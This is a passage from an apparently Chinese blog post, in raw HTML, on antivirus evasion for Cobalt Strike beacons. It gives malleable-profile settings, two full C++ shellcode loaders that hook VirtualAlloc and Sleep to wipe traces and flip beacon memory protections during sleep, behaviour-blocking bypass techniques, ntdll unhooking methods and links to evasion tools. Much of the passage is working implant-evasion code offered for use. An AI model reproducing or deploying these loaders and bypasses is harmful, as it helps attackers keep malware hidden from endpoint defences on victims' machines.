设置为true时，会对数据和代码进行异或加密，3.11版本是单字节异或，4.2版本是13字节异或</p>\n</li>\n<li><p>userwx：设置执行反射dll所分配的内存属性，true为RWX，false为RX</p>\n</li>\n<li><p>cleanup：设置true后，会抹去存放在内存中的反射DLL，false则不会</p>\n</li>\n<li><p>stomppe：设置为true时能对MZ、PE和e_lfanew的值进行混淆</p>\n</li>\n<li><p>obfuscate：设置为true时，能混淆dll的导入表、区段名等信息，使得根据导入表匹配的规则失效</p>\n</li>\n</ul>\n<p>这里我的设置为</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">set userwx          &quot;true&quot;;</span><br><span class=\"line\">set cleanup         &quot;false&quot;;</span><br><span class=\"line\">set sleep_mask      &quot;false&quot;;</span><br><span class=\"line\">set stomppe         &quot;false&quot;;</span><br><span class=\"line\">set obfuscate       &quot;false&quot;;</span><br></pre></td></tr></table></figure>\n\n<p>hook VirtualAlloc，x86上线（当x64 hook三个函数时，会造成内部死锁 <a href=\"https://github.com/TsudaKageyu/minhook/issues/99%EF%BC%89%EF%BC%8Cbeacon%E5%B1%9E%E6%80%A7%E4%B8%BARWX%E4%B8%80%E6%95%B4%E5%9D%97%E5%9C%B0%E5%9D%80%E3%80%82\">https://github.com/TsudaKageyu/minhook/issues/99），beacon属性为RWX一整块地址。</a></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240509181004796.png\" alt=\"image-20240509181004796\"></p>\n<p>再看内存，确实都是beacon的准确地址</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240509181502568.png\" alt=\"image-20240509181502568\"></p>\n<p>再将配置改为</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">set userwx          &quot;false&quot;;</span><br><span class=\"line\">set cleanup         &quot;false&quot;;</span><br><span class=\"line\">set sleep_mask      &quot;false&quot;;</span><br><span class=\"line\">set stomppe         &quot;false&quot;;</span><br><span class=\"line\">set obfuscate       &quot;false&quot;;</span><br></pre></td></tr></table></figure>\n\n<p>hook VirtualAlloc，x86上线，beacon属性分为RW+RX三部分地址。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240510224506184.png\" alt=\"image-20240510224506184\"></p>\n<p>内存情况</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240510224646554.png\" alt=\"image-20240510224646554\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">set userwx          &quot;false&quot;;</span><br><span class=\"line\">set cleanup         &quot;false&quot;;</span><br><span class=\"line\">set sleep_mask      &quot;true&quot;;</span><br><span class=\"line\">set stomppe         &quot;false&quot;;</span><br><span class=\"line\">set obfuscate       &quot;false&quot;;</span><br></pre></td></tr></table></figure>\n\n<p>sleep_mask开启，hook VirtualAlloc，x86上线，heap内存被动态加密。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240510234307048.png\" alt=\"image-20240510234307048\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240510234321484.png\" alt=\"image-20240510234321484\"></p>\n<p>个人使用如下配置进行测试</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">set userwx          &quot;false&quot;;</span><br><span class=\"line\">set cleanup         &quot;false&quot;;</span><br><span class=\"line\">set sleep_mask      &quot;false&quot;;</span><br><span class=\"line\">set stomppe         &quot;false&quot;;</span><br><span class=\"line\">set obfuscate       &quot;false&quot;;</span><br><span class=\"line\">set rich_header     &quot;&quot;;</span><br><span class=\"line\">set smartinject \t&quot;true&quot;;</span><br><span class=\"line\">set allocator \t\t&quot;VirtualAlloc&quot;;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"问题一\"><a href=\"#问题一\" class=\"headerlink\" title=\"问题一\"></a>问题一</h3><p>以编译时x86为例，实战x64环境可以兼容运行x86。hook VirtualAlloc后只留下真正beacon的内存并修改其属性。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;Windows.h&gt;</span><br><span class=\"line\">#include &lt;MinHook.h&gt;</span><br><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">#if defined _M_X64</span><br><span class=\"line\">#pragma comment(lib, &quot;libMinHook-x64-v141-mt.lib&quot;)</span><br><span class=\"line\">#elif defined _M_IX86</span><br><span class=\"line\">#pragma comment(lib, &quot;libMinHook-x86-v141-mt.lib&quot;)</span><br><span class=\"line\">#endif</span><br><span class=\"line\"></span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 定义内存页属性结构体</span><br><span class=\"line\">struct MemoryAttrib &#123;</span><br><span class=\"line\">    LPVOID address;\t\t&#x2F;&#x2F; 内存地址</span><br><span class=\"line\">    DWORD size;\t\t\t&#x2F;&#x2F; 内存大小</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 定义内存信息结构体</span><br><span class=\"line\">struct MemoryInfo &#123;</span><br><span class=\"line\">    MemoryAttrib memoryPage[3];\t\t&#x2F;&#x2F; 能找到符合条件的目标内存最多3个</span><br><span class=\"line\">    int index &#x3D; 0;\t\t\t\t\t&#x2F;&#x2F; 内存下标</span><br><span class=\"line\">    BOOL iscleaned &#x3D; FALSE;\t\t\t&#x2F;&#x2F;是否清除之前的beacon和shellcode遗留</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">MemoryInfo memoryInfo;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;*-------------------------misc func----------------------------------*&#x2F;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 删除 shellcode 和 加密beacon</span><br><span class=\"line\">void DeleteOther()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    MemoryAttrib shellcode &#x3D; memoryInfo.memoryPage[0];</span><br><span class=\"line\">    MemoryAttrib enc_beacon &#x3D; memoryInfo.memoryPage[1];</span><br><span class=\"line\">    printf(&quot;[+]shellcode Address at 0x%p\\n&quot;, shellcode.address);</span><br><span class=\"line\">    printf(&quot;[+]enc_beacon Address at 0x%p\\n&quot;, enc_beacon.address);</span><br><span class=\"line\">    &#x2F;&#x2F; 将内存使用0填充</span><br><span class=\"line\">    RtlSecureZeroMemory(shellcode.address, shellcode.size);</span><br><span class=\"line\">    RtlSecureZeroMemory(enc_beacon.address, enc_beacon.size);</span><br><span class=\"line\">    DWORD oldProt;</span><br><span class=\"line\">    &#x2F;&#x2F;修改属性</span><br><span class=\"line\">    VirtualProtect(shellcode.address, shellcode.size, PAGE_READWRITE, &amp;oldProt);</span><br><span class=\"line\">    VirtualProtect(enc_beacon.address, enc_beacon.size, PAGE_READWRITE, &amp;oldProt);</span><br><span class=\"line\">    memoryInfo.iscleaned &#x3D; TRUE;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;*-------------------------define hook func----------------------------------*&#x2F;</span><br><span class=\"line\">LPVOID(WINAPI* OldVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);</span><br><span class=\"line\">void (WINAPI* OldSleep)(DWORD dwMiliseconds);</span><br><span class=\"line\"></span><br><span class=\"line\">void (WINAPI MyHookedSleep)(DWORD dwMiliseconds);</span><br><span class=\"line\">LPVOID(WINAPI MyHookedVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);</span><br><span class=\"line\"></span><br><span class=\"line\">template &lt;typename T&gt;</span><br><span class=\"line\">inline MH_STATUS MH_CreateHookApiEx(</span><br><span class=\"line\">    LPCWSTR pszModule, LPCSTR pszProcName, LPVOID pDetour, T** ppOriginal)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    return MH_CreateHookApi(</span><br><span class=\"line\">        pszModule, pszProcName, pDetour, reinterpret_cast&lt;LPVOID*&gt;(ppOriginal));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">BOOL Hook()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    if (MH_Initialize() !&#x3D; MH_OK) &#123; return false; &#125;</span><br><span class=\"line\">    &#x2F;&#x2F; hook VirtualAlloc</span><br><span class=\"line\">    if (MH_CreateHookApiEx(L&quot;Kernel32.dll&quot;, &quot;VirtualAlloc&quot;, &amp;MyHookedVirtualAlloc, &amp;OldVirtualAlloc) !&#x3D; MH_OK) &#123; return false; &#125;</span><br><span class=\"line\">    &#x2F;&#x2F; hook Sleep</span><br><span class=\"line\">    if (MH_CreateHookApiEx(L&quot;kernel32&quot;, &quot;Sleep&quot;, &amp;MyHookedSleep, &amp;OldSleep) !&#x3D; MH_OK) &#123; return false; &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    if (MH_EnableHook(MH_ALL_HOOKS) !&#x3D; MH_OK) &#123; return false; &#125;</span><br><span class=\"line\">    return true;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;*-------------------------my hook func--------------------------------*&#x2F;</span><br><span class=\"line\">LPVOID WINAPI MyHookedVirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    &#x2F;&#x2F; 1. shellcode 2. enc-beacon 3. beacon</span><br><span class=\"line\">    LPVOID address &#x3D; OldVirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);</span><br><span class=\"line\">    printf(&quot;[+]VirtualAlloc: Reserved %d at address 0x%p\\n&quot;, dwSize, address);</span><br><span class=\"line\">    memoryInfo.memoryPage[memoryInfo.index].address &#x3D; address;</span><br><span class=\"line\">    memoryInfo.memoryPage[memoryInfo.index].size &#x3D; (DWORD)dwSize;</span><br><span class=\"line\">    memoryInfo.index++;</span><br><span class=\"line\">    return address;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void WINAPI MyHookedSleep(DWORD dwMiliseconds)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    DWORD oldProt;</span><br><span class=\"line\">    if (!memoryInfo.iscleaned) &#123;</span><br><span class=\"line\">        DeleteOther();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    DWORD time &#x3D; dwMiliseconds;</span><br><span class=\"line\">    if (time &gt; 1000) &#123;</span><br><span class=\"line\">        &#x2F;&#x2F;DoSuspendThreads(GetCurrentProcessId(), GetCurrentThreadId());</span><br><span class=\"line\">        printf(&quot;[+]修改beacon属性为RW: address 0x%p\\n&quot;, memoryInfo.memoryPage[2].address);</span><br><span class=\"line\">        VirtualProtect(memoryInfo.memoryPage[2].address, memoryInfo.memoryPage[2].size, PAGE_READWRITE, &amp;oldProt);</span><br><span class=\"line\"></span><br><span class=\"line\">        &#x2F;&#x2F;HeapEncryptDecrypt();</span><br><span class=\"line\">        OldSleep(dwMiliseconds);</span><br><span class=\"line\"></span><br><span class=\"line\">        printf(&quot;[+]修改beacon属性为RWX: address 0x%p\\n&quot;, memoryInfo.memoryPage[2].address);</span><br><span class=\"line\">        VirtualProtect(memoryInfo.memoryPage[2].address, memoryInfo.memoryPage[2].size, PAGE_EXECUTE_READWRITE, &amp;oldProt);</span><br><span class=\"line\">        &#x2F;&#x2F;HeapEncryptDecrypt();</span><br><span class=\"line\">        &#x2F;&#x2F;DoResumeThreads(GetCurrentProcessId(), GetCurrentThreadId());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    else &#123;</span><br><span class=\"line\">        OldSleep(time);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;*-------------------------main--------------------------------*&#x2F;</span><br><span class=\"line\"></span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    if (!Hook()) &#123;return 1; &#125;</span><br><span class=\"line\">    unsigned char buf[] &#x3D; &quot;\\xfc\\xe8\\x89\\x00\\x00\\x00...&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">    const size_t length &#x3D; sizeof(buf);</span><br><span class=\"line\">    void* shellcode &#x3D; VirtualAlloc(NULL, length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">    memcpy(shellcode, buf, length);</span><br><span class=\"line\">    ((void(*)(void)) shellcode)();</span><br><span class=\"line\"></span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>效果图：这里直接修改内存为RWX。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240515013927782.png\" alt=\"image-20240515013927782\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240515014050590.png\" alt=\"image-20240515014050590\"></p>\n<h3 id=\"问题二\"><a href=\"#问题二\" class=\"headerlink\" title=\"问题二\"></a>问题二</h3><p>遍历当前内存页，匹配出带有执行权限的内存地址，标记后进行属性修改。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;Windows.h&gt;</span><br><span class=\"line\">#include &lt;MinHook.h&gt;</span><br><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">#if defined _M_X64</span><br><span class=\"line\">#pragma comment(lib, &quot;libMinHook-x64-v141-mt.lib&quot;)</span><br><span class=\"line\">#elif defined _M_IX86</span><br><span class=\"line\">#pragma comment(lib, &quot;libMinHook-x86-v141-mt.lib&quot;)</span><br><span class=\"line\">#endif</span><br><span class=\"line\"></span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 定义内存页属性结构体</span><br><span class=\"line\">struct MemoryAttrib &#123;</span><br><span class=\"line\">    LPVOID address;\t\t&#x2F;&#x2F; 内存地址</span><br><span class=\"line\">    DWORD size;\t\t\t&#x2F;&#x2F; 内存大小</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 定义内存信息结构体</span><br><span class=\"line\">struct MemoryInfo &#123;</span><br><span class=\"line\">    MemoryAttrib memoryPage[4];\t&#x2F;&#x2F; 能找到符合条件的目标内存最多3个</span><br><span class=\"line\">    int index &#x3D; 0;\t\t\t\t\t&#x2F;&#x2F; 内存下标</span><br><span class=\"line\">    unsigned char* key;\t\t&#x2F;&#x2F; 加解密key</span><br><span class=\"line\">    BOOL isScanMemory &#x3D; FALSE;\t\t\t&#x2F;&#x2F; 是否已查找内存页信息</span><br><span class=\"line\">    BOOL iscleaned &#x3D; FALSE;\t\t\t\t&#x2F;&#x2F;是否清除之前的beacon和shellcode遗留</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">MemoryInfo memoryInfo;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;*-------------------------misc func----------------------------------*&#x2F;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 删除 shellcode 和 加密beacon</span><br><span class=\"line\">void DeleteOther()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    MemoryAttrib shellcode &#x3D; memoryInfo.memoryPage[memoryInfo.index - 3];</span><br><span class=\"line\">    MemoryAttrib enc_beacon &#x3D; memoryInfo.memoryPage[memoryInfo.index - 2];</span><br><span class=\"line\">    printf(&quot;[+]shellcode Address at 0x%p\\n&quot;, shellcode.address);</span><br><span class=\"line\">    printf(&quot;[+]enc_beacon Address at 0x%p\\n&quot;, enc_beacon.address);</span><br><span class=\"line\">    &#x2F;&#x2F; 0填充</span><br><span class=\"line\">    RtlSecureZeroMemory(shellcode.address, shellcode.size);</span><br><span class=\"line\">    RtlSecureZeroMemory(enc_beacon.address, enc_beacon.size);</span><br><span class=\"line\">    DWORD oldProt;</span><br><span class=\"line\">    &#x2F;&#x2F;修改属性</span><br><span class=\"line\">    VirtualProtect(shellcode.address, shellcode.size, PAGE_READWRITE, &amp;oldProt);</span><br><span class=\"line\">    VirtualProtect(enc_beacon.address, enc_beacon.size, PAGE_READWRITE, &amp;oldProt);</span><br><span class=\"line\">    memoryInfo.iscleaned &#x3D; TRUE;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 扫描内存中带有X属性的内存并标记</span><br><span class=\"line\">void ScanMemoryMap()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    &#x2F;&#x2F; 内存块信息结构体</span><br><span class=\"line\">    MEMORY_BASIC_INFORMATION mbi;</span><br><span class=\"line\"></span><br><span class=\"line\">    LPVOID lpAddress &#x3D; 0;</span><br><span class=\"line\">    HANDLE hProcess &#x3D; OpenProcess(MAXIMUM_ALLOWED, FALSE, GetCurrentProcessId());</span><br><span class=\"line\">    int* index &#x3D; &amp;memoryInfo.index;</span><br><span class=\"line\"></span><br><span class=\"line\">    while (VirtualQueryEx(hProcess, lpAddress, &amp;mbi, sizeof(mbi)))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        &#x2F;&#x2F; 查找 RWX &#x2F; X &#x2F;RX</span><br><span class=\"line\">        if (mbi.Protect &#x3D;&#x3D; PAGE_EXECUTE_READWRITE || mbi.Protect &#x3D;&#x3D; PAGE_EXECUTE || mbi.Protect &#x3D;&#x3D; PAGE_EXECUTE_READ &amp;&amp; mbi.Type &#x3D;&#x3D; MEM_PRIVATE)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &#x2F;&#x2F; 保存内存信息</span><br><span class=\"line\">            memoryInfo.memoryPage[*index].address &#x3D; mbi.BaseAddress;</span><br><span class=\"line\">            memoryInfo.memoryPage[*index].size &#x3D; (DWORD)mbi.RegionSize;</span><br><span class=\"line\">            printf(&quot;[%d]扫描到地址: 0x%p\\n&quot;, *index, memoryInfo.memoryPage[*index].address);</span><br><span class=\"line\">            (*index)++;</span><br><span class=\"line\"></span><br><span class=\"line\">            if ((*index) &gt;&#x3D; 4)</span><br><span class=\"line\">                break;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        &#x2F;&#x2F; 更新到下一个内存页</span><br><span class=\"line\">        lpAddress &#x3D; (LPVOID)((DWORD_PTR)mbi.BaseAddress + mbi.RegionSize);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    memoryInfo.isScanMemory &#x3D; TRUE;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;*-------------------------define hook func----------------------------------*&#x2F;</span><br><span class=\"line\">void (WINAPI* OldSleep)(DWORD dwMiliseconds);</span><br><span class=\"line\"></span><br><span class=\"line\">void (WINAPI MyHookedSleep)(DWORD dwMiliseconds);</span><br><span class=\"line\"></span><br><span class=\"line\">template &lt;typename T&gt;</span><br><span class=\"line\">inline MH_STATUS MH_CreateHookApiEx(</span><br><span class=\"line\">    LPCWSTR pszModule, LPCSTR pszProcName, LPVOID pDetour, T** ppOriginal)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    return MH_CreateHookApi(</span><br><span class=\"line\">        pszModule, pszProcName, pDetour, reinterpret_cast&lt;LPVOID*&gt;(ppOriginal));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">BOOL Hook()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    if (MH_Initialize() !&#x3D; MH_OK) &#123; return false; &#125;</span><br><span class=\"line\">    &#x2F;&#x2F;Sleep</span><br><span class=\"line\">    if (MH_CreateHookApiEx(L&quot;kernel32&quot;, &quot;Sleep&quot;, &amp;MyHookedSleep, &amp;OldSleep) !&#x3D; MH_OK) &#123; return false; &#125;</span><br><span class=\"line\">    if (MH_EnableHook(MH_ALL_HOOKS) !&#x3D; MH_OK) &#123; return false; &#125;</span><br><span class=\"line\">    return true;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;*-------------------------my hook func--------------------------------*&#x2F;</span><br><span class=\"line\">void WINAPI MyHookedSleep(DWORD dwMiliseconds)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    DWORD oldProt;</span><br><span class=\"line\">    if (!memoryInfo.isScanMemory) &#123;</span><br><span class=\"line\">        ScanMemoryMap();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    if (!memoryInfo.iscleaned) &#123;</span><br><span class=\"line\">        DeleteOther();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    DWORD time &#x3D; dwMiliseconds;</span><br><span class=\"line\">    if (time &gt; 1000) &#123;</span><br><span class=\"line\">        MemoryAttrib beacon &#x3D; memoryInfo.memoryPage[memoryInfo.index - 1];</span><br><span class=\"line\">        &#x2F;&#x2F;DoSuspendThreads(GetCurrentProcessId(), GetCurrentThreadId());</span><br><span class=\"line\">        printf(&quot;[+]修改beacon属性为RW: address 0x%p\\n&quot;, beacon.address);</span><br><span class=\"line\">        VirtualProtect(beacon.address, beacon.size, PAGE_READWRITE, &amp;oldProt);</span><br><span class=\"line\">        &#x2F;&#x2F;HeapEncryptDecrypt();</span><br><span class=\"line\"></span><br><span class=\"line\">        OldSleep(dwMiliseconds);</span><br><span class=\"line\">        printf(&quot;[+]修改beacon属性为RX: address 0x%p\\n&quot;, beacon.address);</span><br><span class=\"line\">        VirtualProtect(beacon.address, beacon.size, PAGE_EXECUTE_READ, &amp;oldProt);</span><br><span class=\"line\">        &#x2F;&#x2F;HeapEncryptDecrypt();</span><br><span class=\"line\">        &#x2F;&#x2F;DoResumeThreads(GetCurrentProcessId(), GetCurrentThreadId());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    else &#123;</span><br><span class=\"line\">        OldSleep(time);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;*-------------------------main--------------------------------*&#x2F;</span><br><span class=\"line\"></span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    if (!Hook()) &#123;return 1; &#125;</span><br><span class=\"line\">    unsigned char buf[] &#x3D; &quot;\\xfc\\xe8\\x89\\x00\\x00\\x00&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">    const size_t length &#x3D; sizeof(buf);</span><br><span class=\"line\">    void* shellcode &#x3D; VirtualAlloc(NULL, length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">    memcpy(shellcode, buf, length);</span><br><span class=\"line\">    ((void(*)(void)) shellcode)();</span><br><span class=\"line\"></span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>效果图：sleep时，beacon属性为RW</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240515153954755.png\" alt=\"image-20240515153954755\"></p>\n<p>没有sleep时，属性为RW+RX三部分</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240515154122799.png\" alt=\"image-20240515154122799\"></p>\n<p>Ref：<a href=\"https://github.com/mgeeky/ShellcodeFluctuation\">ShellcodeFluctuation</a>、<a href=\"https://xz.aliyun.com/t/12701?time__1311=mqmhDvox8GOD/D0lD2DUh4fhBFeM2rwD\">Cobalt Strike与YARA：我能拥有你的签名吗？</a>、<a href=\"https://mp.weixin.qq.com/s?__biz=MzkxMTMxMjI2OQ==&mid=2247484016&idx=1&sn=c788a9a63f3db2f2e7a11f3c82534281&chksm=c11f5692f668df84677a4fe2bff5ea3104f9e349533d0e70815c246edf89c53cd27922cdef43&scene=178&cur_album_id=2280727834220429320#rd\">Beacon sleep_mask 分析</a>、<a href=\"https://www.cobaltstrike.com/blog/cobalt-strike-4-4-the-one-with-the-reconnect-button\">Cobalt Strike 4.4: The One with the Reconnect Button</a>、<a href=\"https://bbs.kanxue.com/thread-274676.htm\">CobaltStrike检测与对抗</a>、<a href=\"https://www.arashparsa.com/catching-a-malware-with-no-name/\">Analyzing Malware with Hooks, Stomps, and Return-addresses</a>、<a href=\"https://oxis.github.io/GPUSleep/\">GPUSleep. Makes your beacon disappear into GPU memory</a></p>\n<h2 id=\"栈欺骗\"><a href=\"#栈欺骗\" class=\"headerlink\" title=\"栈欺骗\"></a>栈欺骗</h2><p>能力之外：</p>\n<p><a href=\"https://mp.weixin.qq.com/s?__biz=Mzk0NTUwNzAyOA==&mid=2247483991&idx=1&sn=726883083a2ae0c4c33359a1c58324fb&chksm=c3151decf46294faabbcb33c6ebc78f083ec1a40500afabfedf67c8fe65687b38007846b5db1&scene=126&sessionid=1698330378&key=98b23746bc43506087e78253d823e63912c74cdda7d97957c104dbfde02ef56562289ae43f8f1071a4eae6991081caa559ba450eba5d6675fc1e4465dda302207ea7811c47c64e4ed1ce6bbc7ecc08ca27aa2ea2f67552c9aaab108b9e262a7bc13ce7c24ecde47c4ff97300532c7900c9661d7aeda707754882640febb30991&ascene=15&uin=MzgxODQ4MjMz&devicetype=Windows+10+x64&version=63060012&lang=zh_CN&session_us=gh_183ba3e9a2da&countrycode=GY&exportkey=n_ChQIAhIQd3qUEWSakepdJdInpn+HPRLvAQIE97dBBAEAAAAAAAEAFgxiFOsAAAAOpnltbLcz9gKNyK89dVj0aGYW1jtewsyXFFBTLHMdxvcZfewW8vHrEIattaVm0UTj0AIlGlbxX2RWBGo/rB7uauz9/4qnReipfVTgrmwvV2VBid9d8GtC/7TnNenqy9j2GhB0RSgzxsjAnY0GelrpfTymDg+C9f1afYsEy6Nllaef/ioEnBRzk8JJBKLPEnJM1j5MwuoLcHQo2Wnjt379MPM2r7FEQqqciTK3cR2kpbcWikH2PcwXsDis1FDvwg2mkMMDIJIeM8W8X5mL3ItCcAAOzFnDfvV5&acctmode=0&pass_ticket=7M9Jv6ZxglLxMB7GtRyi4WlVHFCf3labClIm+0tqJ4xzN2VRO8/dUPM0tpg5TJWZ&wx_header=0&fontgear=2\">调用栈欺骗技术</a></p>\n<p><a href=\"https://xz.aliyun.com/t/14487?time__1311=mqmx9QD=Dt0QO405DIYYK0=Fi=L6Kkdh7bD\">初探堆栈欺骗之静态欺骗</a></p>\n<h2 id=\"工具\"><a href=\"#工具\" class=\"headerlink\" title=\"工具\"></a>工具</h2><p><a href=\"https://github.com/kyleavery/AceLdr\">kyleavery/AceLdr: Cobalt Strike UDRL for memory scanner evasion</a>  涵盖以上所有bypass。</p>\n<h1 id=\"行为对抗免杀\"><a href=\"#行为对抗免杀\" class=\"headerlink\" title=\"行为对抗免杀\"></a>行为对抗免杀</h1><p>杀软目前都有主动防御，对恶意行为进行拦截提示，比如这些行为：</p>\n<ul>\n<li><p>注册表操作、添加启动项、添加服务</p>\n</li>\n<li><p>文件写入、读系统文件、删除文件、移动文件</p>\n</li>\n<li><p>杀进程、创建进程、加载dll</p>\n</li>\n<li><p>注入、劫持等</p>\n</li>\n</ul>\n<p>如下几种bypass</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">1. 替换API</span><br><span class=\"line\">使用相同功能的API进行替换，由于杀软只会针对一部分API进行拦截，对于API不能做到面面俱到的拦截，比如未导出API和底层API，所以这种方法还是有效的。</span><br><span class=\"line\"></span><br><span class=\"line\">2. 重写API</span><br><span class=\"line\">完全重写系统的API功能，实现自己的对应功能API，对ring3的行为拦截非常有效。</span><br><span class=\"line\"></span><br><span class=\"line\">3. 合理更改调用顺序</span><br><span class=\"line\">有时被拦截的行为是通过多个API组合来完成的，所以合理替换顺序，绕过杀软的拦截策略，也可以绕过行为拦截</span><br><span class=\"line\"></span><br><span class=\"line\">4. 绕过调用源</span><br><span class=\"line\">直接调用0环API。</span><br></pre></td></tr></table></figure>\n\n<p>关于行为对抗，我建议借鉴学习该项目：<a href=\"https://github.com/yanghaoi/CobaltStrike_CNA\">CobaltStrike_CNA</a>，在cs上使用 <code>net user admin /delete</code> 就会被拦截，看一下该项目是怎么绕过的：</p>\n<p>通过使用cs的反射dll技术，调用 reflective_dll.dll</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240516145945893.png\" alt=\"image-20240516145945893\"></p>\n<p>调用的是 <code>NetUserAdd</code> API，比较常见的api了</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240516150042665.png\" alt=\"image-20240516150042665\"></p>\n<p>[利用ReflectiveDLL来武装你的Cobalt Strike](<a href=\"https://uknowsec.cn/posts/notes/%E5%88%A9%E7%94%A8ReflectiveDLL%E6%9D%A5%E6%AD%A6%E8%A3%85%E4%BD%A0%E7%9A%84Cobalt\">https://uknowsec.cn/posts/notes/利用ReflectiveDLL来武装你的Cobalt</a> Strike.html)</p>\n<p><a href=\"https://www.anquanke.com/post/id/264890\">一些绕过AV进行UserAdd的方法总结及实现</a></p>\n<h1 id=\"unhook-API\"><a href=\"#unhook-API\" class=\"headerlink\" title=\"unhook API\"></a>unhook API</h1><p>目的就是获取纯净的 ntdll 以避免 API 函数被hook。</p>\n<p>四种方式：</p>\n<ul>\n<li>磁盘重载 ntdll</li>\n<li>PE 文件映射</li>\n<li>挂起的进程获取干净的ntdll</li>\n<li>自定义直接跳转</li>\n</ul>\n<p><a href=\"https://www.cnblogs.com/fdxsec/p/18146252\">几种unhook手法的学习 - fdx_xdf</a></p>\n<p><a 